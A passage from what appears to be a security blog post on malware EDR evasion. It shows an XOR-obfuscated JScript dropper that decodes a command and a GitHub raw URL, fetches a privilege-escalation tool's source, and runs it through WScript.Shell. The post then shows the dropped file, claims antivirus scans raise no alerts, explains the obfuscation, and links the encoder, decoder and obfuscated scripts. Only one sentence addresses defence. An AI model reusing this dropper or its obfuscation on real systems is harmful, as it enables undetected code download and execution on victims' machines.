<span class="kd">var</span> <span class="nx">encoded2</span> <span class="o">=</span> <span class="p">[</span><span class="mi">104</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">61</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">61</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">45</span><span class="p">];</span>
<span class="kd">var</span> <span class="nx">thelink</span> <span class="o">=</span>  <span class="p">[</span><span class="mi">32</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">63</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">61</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">61</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">123</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">123</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">56</span><span class="p">];</span>
		<span class="kd">var</span> <span class="nx">sizeof1</span><span class="o">=</span><span class="nx">encoded1</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
		<span class="kd">var</span> <span class="nx">sizeof2</span><span class="o">=</span><span class="nx">encoded2</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
		<span class="kd">var</span> <span class="nx">sizeof3</span><span class="o">=</span><span class="nx">thelink</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
		
    <span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ActiveXObject</span><span class="p">(</span><span class="dl">'</span><span class="s1">WScript.Shell</span><span class="dl">'</span><span class="p">);</span>
		<span class="k">for </span><span class="p">(</span><span class="nx">a</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">a</span><span class="o">&lt;</span><span class="nx">sizeof1</span><span class="p">;</span><span class="nx">a</span><span class="o">++</span><span class="p">)</span>
		<span class="p">{</span>
		<span class="nx">decoded1</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">=</span><span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">encoded1</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span> <span class="o">^</span> <span class="mi">72</span><span class="p">);</span>
		<span class="p">}</span>
		<span class="k">for </span><span class="p">(</span><span class="nx">a</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">a</span><span class="o">&lt;</span><span class="nx">sizeof2</span><span class="p">;</span><span class="nx">a</span><span class="o">++</span><span class="p">)</span>
		<span class="p">{</span>
		<span class="nx">decoded2</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">=</span><span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">encoded2</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span> <span class="o">^</span> <span class="mi">72</span><span class="p">);</span>
		<span class="p">}</span>
		<span class="k">for </span><span class="p">(</span><span class="nx">a</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">a</span><span class="o">&lt;</span><span class="nx">sizeof3</span><span class="p">;</span><span class="nx">a</span><span class="o">++</span><span class="p">)</span>
		<span class="p">{</span>
		<span class="nx">decodedURI</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">=</span><span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">thelink</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span> <span class="o">^</span> <span class="mi">72</span><span class="p">);</span>
		<span class="p">}</span>
		
		<span class="nx">decode1final</span><span class="o">=</span><span class="nx">decoded1</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="dl">""</span><span class="p">);</span>
		<span class="nx">decode2final</span><span class="o">=</span><span class="nx">decoded2</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="dl">""</span><span class="p">);</span>
		<span class="nx">linkURI</span><span class="o">=</span><span class="nx">decodedURI</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="dl">""</span><span class="p">);</span>
		
	    <span class="nx">WScript</span><span class="p">.</span><span class="nc">Echo</span><span class="p">(</span><span class="nx">decode1final</span> <span class="o">+</span> <span class="nx">linkURI</span> <span class="o">+</span> <span class="nx">decode2final</span><span class="p">);</span>
      <span class="nx">obj</span><span class="p">.</span><span class="nc">Run</span><span class="p">(</span><span class="nx">decode1final</span><span class="o">+</span><span class="nx">linkURI</span><span class="o">+</span><span class="nx">decode2final</span><span class="p">);</span>
</code></pre></div></div>

<p>let‚Äôs run it!</p>

<p><img src="https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/56572791-d738-4fd8-9418-13d01caeeaa9" alt="image">
<img src="https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/478335e5-d407-4148-8afe-92f7128a4e14" alt="image"></p>

<p>want to see what‚Äôs inside the dropped file?  It‚Äôs the code to elevationstation:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\temp\ourjsfiles&gt;type c:\users\Public\thedroppedfile
#define _CRT_SECURE_NO_WARNINGS
#include &lt;iostream&gt;
#include &lt;fstream&gt;
#include &lt;Windows.h&gt;
#include &lt;string&gt;
#include &lt;conio.h&gt;
#include &lt;lmcons.h&gt;
#include &lt;tchar.h&gt;
#include &lt;strsafe.h&gt;
#include &lt;sddl.h&gt;
#include &lt;userenv.h&gt;
#include &lt;Dbghelp.h&gt;
#include &lt;winternl.h&gt;
#include &lt;TlHelp32.h&gt;
#include &lt;psapi.h&gt;
#include "def.h"

#pragma comment(lib, "userenv.lib")

using namespace std;

//errorcodes: https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-
//integrity levels (good resource!): https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/bb625963(v=msdn.10)?redirectedfrom=MSDN
//get process name: https://stackoverflow.com/questions/4570174/how-to-get-the-process-name-in-c
//change integrity level: https://social.msdn.microsoft.com/Forums/en-US/4c78de2f-376c-4eb1-834b-de681f866ada/change-integrity-level-in-current-process-uiaccess?forum=vcgeneral
//more integrity level info: https://stackoverflow.com/questions/12774738/how-to-determine-the-integrity-level-of-a-process
//more integrity level info #2: https://social.msdn.microsoft.com/Forums/windowsdesktop/en-US/09ebc7f1-e3e9-4fd3-a57e-1d43b36e8f82/how-to-tell-what-processes-are-running-with-elevated-privileges?forum=windowssecurity
//SID info: https://learn.microsoft.com/en-US/windows-server/identity/ad-ds/manage/understand-security-identifiers
//lower our token integrity level example: https://kb.digital-detective.net/display/BF/Understanding+and+Working+in+Protected+Mode+Internet+Explorer

void Color(int color)
{
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
}
BOOL NamedPipeImpersonate()
{
    setProcessPrivs(SE_IMPERSONATE_NAME);
    Color(2);
    cout &lt;&lt; "[+] Downloading named pipe client for you from the repo\n";
    Color(7);
</code></pre></div></div>

<p>So, our dropped file was downloaded successfully.  How about AV/EDR?</p>

<p>I‚Äôll scan it for you so you can see for yourself:</p>

<p><img src="https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/b5c2dd14-023f-4b7d-bcc6-1f846066425f" alt="image">
<img src="https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/c5587552-a2d8-4105-b790-4a98591df99a" alt="image"></p>

<p><strong>nothing. no alerts, triggers, nothing.</strong></p>

<p>As for how I obfuscated it, there are online tools for that but honestly I just did control+F and did find and replace, typing in random letters on my keyboard to jumble the variable names.  pretty easy.</p>

<p>You can defend against this type of malware threat with Windows Application Control and proper group policies surrounding what your users can and cannot execute.  .js scripts are likely never going to be a script your user will need to use on it‚Äôs own outside of a browser</p>

<h2 id="code-from-todays-writeup"><strong><em>Code From Today‚Äôs Writeup</em></strong><a class="header-link" href="https://g3tsyst3m.com/edr%20bypass/Malware-EDR-Evasion-Techniques/#code-from-todays-writeup" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p><a href="https://raw.githubusercontent.com/g3tsyst3m/CodefromBlog/main/2023-09-27-Malware%20EDR%20Evasion%20Techniques/decoder.js">decoder.js</a></p>

<p><a href="https://raw.githubusercontent.com/g3tsyst3m/CodefromBlog/main/2023-09-27-Malware%20EDR%20Evasion%20Techniques/encoder.js">encoder.js</a></p>

<p><a href="https://raw.githubusercontent.com/g3tsyst3m/CodefromBlog/main/2023-09-27-Malware%20EDR%20Evasion%20Techniques/obfuscated.js">obfuscated.js</a></p>

<p>As Always, thank you for your time and I hope this proves helpful toward greater security awareness around this type of malware technique</p>

<p>-R.B.C.</p>


        
      </section>

      

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?text=Malware+EDR+Evasion+Techniques%20https%3A%2F%2Fg3tsyst3m.com%2Fedr%2520bypass%2FMalware-EDR-Evasion-Techniques%2F" class="btn btn--twitter" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fg3tsyst3m.com%2Fedr%2520bypass%2FMalware-EDR-Evasion-Techniques%2F" class="btn btn--facebook" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fg3tsyst3m.com%2Fedr%2520bypass%2FMalware-EDR-Evasion-Techniques%2F" class="btn btn--linkedin" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  

    </div>

    
      <div class="page__comments">
  
  
      <h4 class="page__comments-title">Leave a comment</h4>
      <section id="utterances-comments"><div class="utterances">
    <div class="utterances-frame" title="Comments" scrolling="no" src="cid:frame-8DE6C7B0BE70B56DAF4AAB35D6E03FC1@mhtml.blink" loading="lazy" data-original-tag="iframe"></div>
  </div></section>
    
</div>

    
  </article>

  
  
    <div class="page__related">
      <h2 class="page__related-title">You may also enjoy</h2>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope="" itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="https://g3tsyst3m.com/assets/images/ropgadget.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="https://g3tsyst3m.com/lotp/Living-off-the-Process/" rel="permalink">Living off the Process
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2026-01-29T00:00:00+00:00">January 29, 2026</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          14 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Hello again everyone!  Hope the start to the new year is treating you well.  I am excited to share a new blog post with you!  Furthermore, I‚Äôd consider the c...</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope="" itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="https://g3tsyst3m.com/assets/images/chunkyshellcode.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="https://g3tsyst3m.com/shellcode%20fragmentation/in-memory%20evasion/Evading-Signature-Based-Memory-Detection-Shellcode-Fragmentation-and-Staged-Reassembly/" rel="permalink">Evading Signature Based Memory Detection - Shellcode Fragmentation and Staged Reassembly
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2025-12-23T00:00:00+00:00">December 23, 2025</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          9 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Hey everyone, and hope the holiday season is treating you well!  üéÖüéÑüéÅ  I‚Äôve been sitting on this blog post for quite some time now and it‚Äôs high time I went a...</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope="" itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="https://g3tsyst3m.com/assets/images/memmapper2.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="https://g3tsyst3m.com/shellcode/pic/PIC-Shellcode-from-the-Ground-up-Part-2/" rel="permalink">PIC Shellcode from the Ground up - Part 2
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2025-11-25T00:00:00+00:00">November 25, 2025</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          20 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Let‚Äôs PIC back up where we left off shall we? üò∏ I gave you the framework for developing PIC friendly shellcode back in Part 1.  We went from the original cod...</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope="" itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="https://g3tsyst3m.com/assets/images/memmapper.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="https://g3tsyst3m.com/shellcode/pic/PIC-Shellcode-from-the-Ground-up-Part-1/" rel="permalink">PIC Shellcode from the Ground up - Part 1
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2025-11-05T00:00:00+00:00">November 5, 2025</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          23 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Have you ever wondered how the popularized PIC (position independent code) actually works?  I can answer that question alongside you with a resounding YES! Y...</p>
  </article>
</div>

        
      </div>
    </div>
  
  
</div>

    </div>

    

    

    
  







    

  





  

</body></html>